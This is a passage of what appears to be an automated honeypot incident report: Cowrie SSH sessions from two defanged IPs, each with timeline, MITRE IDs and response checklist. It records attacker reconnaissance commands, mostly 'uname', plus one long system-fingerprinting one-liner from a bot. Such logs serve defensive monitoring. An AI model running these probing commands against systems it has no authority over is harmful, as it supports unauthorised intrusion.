|---|---|
| `2026-09-10 18:55:59` | `cowrie.session.connect` |
| `2026-09-10 18:55:59` | `cowrie.client.version` |
| `2026-09-10 18:55:59` | `cowrie.client.kex` |
| `2026-09-10 18:56:02` | `cowrie.login.success` |
| `2026-09-10 18:56:03` | `cowrie.session.params` |
| `2026-09-10 18:56:03` | `cowrie.command.input` |
| `2026-09-10 18:56:03` | `cowrie.log.closed` |
| `2026-09-10 18:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12c6e067f817

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:05` | `cowrie.session.connect` |
| `2026-09-10 18:56:05` | `cowrie.client.version` |
| `2026-09-10 18:56:05` | `cowrie.client.kex` |
| `2026-09-10 18:56:06` | `cowrie.login.success` |
| `2026-09-10 18:56:06` | `cowrie.session.params` |
| `2026-09-10 18:56:06` | `cowrie.command.input` |
| `2026-09-10 18:56:06` | `cowrie.log.closed` |
| `2026-09-10 18:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c128a4ffd02d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:10` | `cowrie.session.connect` |
| `2026-09-10 18:56:10` | `cowrie.client.version` |
| `2026-09-10 18:56:10` | `cowrie.client.kex` |
| `2026-09-10 18:56:11` | `cowrie.login.success` |
| `2026-09-10 18:56:12` | `cowrie.session.params` |
| `2026-09-10 18:56:12` | `cowrie.command.input` |
| `2026-09-10 18:56:12` | `cowrie.log.closed` |
| `2026-09-10 18:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0729cc7d220e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:16` | `cowrie.session.connect` |
| `2026-09-10 18:56:16` | `cowrie.client.version` |
| `2026-09-10 18:56:16` | `cowrie.client.kex` |
| `2026-09-10 18:56:16` | `cowrie.login.success` |
| `2026-09-10 18:56:17` | `cowrie.session.params` |
| `2026-09-10 18:56:17` | `cowrie.command.input` |
| `2026-09-10 18:56:17` | `cowrie.log.closed` |
| `2026-09-10 18:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63829cdba048

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:21` | `cowrie.session.connect` |
| `2026-09-10 18:56:21` | `cowrie.client.version` |
| `2026-09-10 18:56:21` | `cowrie.client.kex` |
| `2026-09-10 18:56:22` | `cowrie.login.success` |
| `2026-09-10 18:56:23` | `cowrie.session.params` |
| `2026-09-10 18:56:23` | `cowrie.command.input` |
| `2026-09-10 18:56:23` | `cowrie.log.closed` |
| `2026-09-10 18:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34a30cf596b4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:26` | `cowrie.session.connect` |
| `2026-09-10 18:56:26` | `cowrie.client.version` |
| `2026-09-10 18:56:26` | `cowrie.client.kex` |
| `2026-09-10 18:56:26` | `cowrie.login.success` |
| `2026-09-10 18:56:27` | `cowrie.session.params` |
| `2026-09-10 18:56:27` | `cowrie.command.input` |
| `2026-09-10 18:56:28` | `cowrie.log.closed` |
| `2026-09-10 18:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-585eef0c01ba

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:32` | `cowrie.session.connect` |
| `2026-09-10 18:56:32` | `cowrie.client.version` |
| `2026-09-10 18:56:32` | `cowrie.client.kex` |
| `2026-09-10 18:56:33` | `cowrie.login.success` |
| `2026-09-10 18:56:34` | `cowrie.session.params` |
| `2026-09-10 18:56:34` | `cowrie.command.input` |
| `2026-09-10 18:56:34` | `cowrie.log.closed` |
| `2026-09-10 18:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fe4995f2223

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:37` | `cowrie.session.connect` |
| `2026-09-10 18:56:37` | `cowrie.client.version` |
| `2026-09-10 18:56:38` | `cowrie.client.kex` |
| `2026-09-10 18:56:39` | `cowrie.login.success` |
| `2026-09-10 18:56:40` | `cowrie.session.params` |
| `2026-09-10 18:56:40` | `cowrie.command.input` |
| `2026-09-10 18:56:41` | `cowrie.log.closed` |
| `2026-09-10 18:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa40da1cc718

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:43` | `cowrie.session.connect` |
| `2026-09-10 18:56:43` | `cowrie.client.version` |
| `2026-09-10 18:56:43` | `cowrie.client.kex` |
| `2026-09-10 18:56:44` | `cowrie.login.success` |
| `2026-09-10 18:56:45` | `cowrie.session.params` |
| `2026-09-10 18:56:45` | `cowrie.command.input` |
| `2026-09-10 18:56:46` | `cowrie.log.closed` |
| `2026-09-10 18:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7815d9b1779

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:49` | `cowrie.session.connect` |
| `2026-09-10 18:56:49` | `cowrie.client.version` |
| `2026-09-10 18:56:49` | `cowrie.client.kex` |
| `2026-09-10 18:56:49` | `cowrie.login.success` |
| `2026-09-10 18:56:50` | `cowrie.session.params` |
| `2026-09-10 18:56:50` | `cowrie.command.input` |
| `2026-09-10 18:56:50` | `cowrie.log.closed` |
| `2026-09-10 18:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-046bb434844a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:54` | `cowrie.session.connect` |
| `2026-09-10 18:56:54` | `cowrie.client.version` |
| `2026-09-10 18:56:54` | `cowrie.client.kex` |
| `2026-09-10 18:56:55` | `cowrie.login.success` |
| `2026-09-10 18:56:56` | `cowrie.session.params` |
| `2026-09-10 18:56:56` | `cowrie.command.input` |
| `2026-09-10 18:56:56` | `cowrie.log.closed` |
| `2026-09-10 18:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f602ae052dc

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:56 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:56:59` | `cowrie.session.connect` |
| `2026-09-10 18:56:59` | `cowrie.client.version` |
| `2026-09-10 18:57:00` | `cowrie.client.kex` |
| `2026-09-10 18:57:00` | `cowrie.login.success` |
| `2026-09-10 18:57:01` | `cowrie.session.params` |
| `2026-09-10 18:57:01` | `cowrie.command.input` |
| `2026-09-10 18:57:01` | `cowrie.log.closed` |
| `2026-09-10 18:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d77b22cc2e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:05` | `cowrie.session.connect` |
| `2026-09-10 18:57:05` | `cowrie.client.version` |
| `2026-09-10 18:57:06` | `cowrie.client.kex` |
| `2026-09-10 18:57:06` | `cowrie.login.success` |
| `2026-09-10 18:57:07` | `cowrie.session.params` |
| `2026-09-10 18:57:07` | `cowrie.command.input` |
| `2026-09-10 18:57:07` | `cowrie.log.closed` |
| `2026-09-10 18:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a8f8e56dc43

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:11` | `cowrie.session.connect` |
| `2026-09-10 18:57:11` | `cowrie.client.version` |
| `2026-09-10 18:57:11` | `cowrie.client.kex` |
| `2026-09-10 18:57:12` | `cowrie.login.success` |
| `2026-09-10 18:57:13` | `cowrie.session.params` |
| `2026-09-10 18:57:13` | `cowrie.command.input` |
| `2026-09-10 18:57:13` | `cowrie.log.closed` |
| `2026-09-10 18:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c5209220d2

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:17` | `cowrie.session.connect` |
| `2026-09-10 18:57:17` | `cowrie.client.version` |
| `2026-09-10 18:57:17` | `cowrie.client.kex` |
| `2026-09-10 18:57:17` | `cowrie.login.success` |
| `2026-09-10 18:57:18` | `cowrie.session.params` |
| `2026-09-10 18:57:18` | `cowrie.command.input` |
| `2026-09-10 18:57:19` | `cowrie.log.closed` |
| `2026-09-10 18:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-906fbea44f97

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:23` | `cowrie.session.connect` |
| `2026-09-10 18:57:23` | `cowrie.client.version` |
| `2026-09-10 18:57:23` | `cowrie.client.kex` |
| `2026-09-10 18:57:24` | `cowrie.login.success` |
| `2026-09-10 18:57:24` | `cowrie.session.params` |
| `2026-09-10 18:57:24` | `cowrie.command.input` |
| `2026-09-10 18:57:25` | `cowrie.log.closed` |
| `2026-09-10 18:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a7f94e47b81

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:29` | `cowrie.session.connect` |
| `2026-09-10 18:57:29` | `cowrie.client.version` |
| `2026-09-10 18:57:29` | `cowrie.client.kex` |
| `2026-09-10 18:57:29` | `cowrie.login.success` |
| `2026-09-10 18:57:30` | `cowrie.session.params` |
| `2026-09-10 18:57:30` | `cowrie.command.input` |
| `2026-09-10 18:57:30` | `cowrie.log.closed` |
| `2026-09-10 18:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd34d8605e3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:34` | `cowrie.session.connect` |
| `2026-09-10 18:57:34` | `cowrie.client.version` |
| `2026-09-10 18:57:35` | `cowrie.client.kex` |
| `2026-09-10 18:57:35` | `cowrie.login.success` |
| `2026-09-10 18:57:36` | `cowrie.session.params` |
| `2026-09-10 18:57:36` | `cowrie.command.input` |
| `2026-09-10 18:57:36` | `cowrie.log.closed` |
| `2026-09-10 18:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc841922e126

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:40` | `cowrie.session.connect` |
| `2026-09-10 18:57:40` | `cowrie.client.version` |
| `2026-09-10 18:57:40` | `cowrie.client.kex` |
| `2026-09-10 18:57:41` | `cowrie.login.success` |
| `2026-09-10 18:57:42` | `cowrie.session.params` |
| `2026-09-10 18:57:42` | `cowrie.command.input` |
| `2026-09-10 18:57:42` | `cowrie.log.closed` |
| `2026-09-10 18:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0bb67195e4f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:44` | `cowrie.session.connect` |
| `2026-09-10 18:57:45` | `cowrie.client.version` |
| `2026-09-10 18:57:45` | `cowrie.client.kex` |
| `2026-09-10 18:57:46` | `cowrie.login.success` |
| `2026-09-10 18:57:47` | `cowrie.session.params` |
| `2026-09-10 18:57:47` | `cowrie.command.input` |
| `2026-09-10 18:57:47` | `cowrie.command.input` |
| `2026-09-10 18:57:47` | `cowrie.command.input` |
| `2026-09-10 18:57:47` | `cowrie.command.input` |
| `2026-09-10 18:57:47` | `cowrie.command.input` |
| `2026-09-10 18:57:47` | `cowrie.command.success` |
| `2026-09-10 18:57:47` | `cowrie.command.input` |
| `2026-09-10 18:57:47` | `cowrie.command.input` |
| `2026-09-10 18:57:47` | `cowrie.command.input` |
| `2026-09-10 18:57:47` | `cowrie.command.input` |
| `2026-09-10 18:57:47` | `cowrie.log.closed` |
| `2026-09-10 18:57:49` | `cowrie.session.params` |
| `2026-09-10 18:57:49` | `cowrie.command.input` |
| `2026-09-10 18:57:49` | `cowrie.log.closed` |
| `2026-09-10 18:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be2deee690c3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:45` | `cowrie.session.connect` |
| `2026-09-10 18:57:45` | `cowrie.client.version` |
| `2026-09-10 18:57:45` | `cowrie.client.kex` |
| `2026-09-10 18:57:47` | `cowrie.login.success` |
| `2026-09-10 18:57:48` | `cowrie.session.params` |
| `2026-09-10 18:57:48` | `cowrie.command.input` |
| `2026-09-10 18:57:49` | `cowrie.log.closed` |
| `2026-09-10 18:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89f80d46c314

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:51` | `cowrie.session.connect` |
| `2026-09-10 18:57:51` | `cowrie.client.version` |
| `2026-09-10 18:57:51` | `cowrie.client.kex` |
| `2026-09-10 18:57:52` | `cowrie.login.success` |
| `2026-09-10 18:57:53` | `cowrie.session.params` |
| `2026-09-10 18:57:53` | `cowrie.command.input` |
| `2026-09-10 18:57:53` | `cowrie.log.closed` |
| `2026-09-10 18:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86e11dd5dc1e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:57 |
| **Last Seen** | 2026-09-10 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:57:56` | `cowrie.session.connect` |
| `2026-09-10 18:57:56` | `cowrie.client.version` |
| `2026-09-10 18:57:56` | `cowrie.client.kex` |
| `2026-09-10 18:57:57` | `cowrie.login.success` |
| `2026-09-10 18:57:58` | `cowrie.session.params` |
| `2026-09-10 18:57:58` | `cowrie.command.input` |
| `2026-09-10 18:57:58` | `cowrie.log.closed` |
| `2026-09-10 18:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb52fbf67c3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:58 |
| **Last Seen** | 2026-09-10 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:58:03` | `cowrie.session.connect` |
| `2026-09-10 18:58:03` | `cowrie.client.version` |
| `2026-09-10 18:58:03` | `cowrie.client.kex` |
| `2026-09-10 18:58:03` | `cowrie.login.success` |
| `2026-09-10 18:58:04` | `cowrie.session.params` |
| `2026-09-10 18:58:04` | `cowrie.command.input` |
| `2026-09-10 18:58:04` | `cowrie.log.closed` |
| `2026-09-10 18:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0dec685ea2e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:58 |
| **Last Seen** | 2026-09-10 18:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:58:07` | `cowrie.session.connect` |
| `2026-09-10 18:58:08` | `cowrie.client.version` |
| `2026-09-10 18:58:08` | `cowrie.client.kex` |
| `2026-09-10 18:58:09` | `cowrie.login.success` |
| `2026-09-10 18:58:11` | `cowrie.session.params` |
| `2026-09-10 18:58:11` | `cowrie.command.input` |
| `2026-09-10 18:58:11` | `cowrie.log.closed` |
| `2026-09-10 18:58:11` | `cowrie.session.closed` |

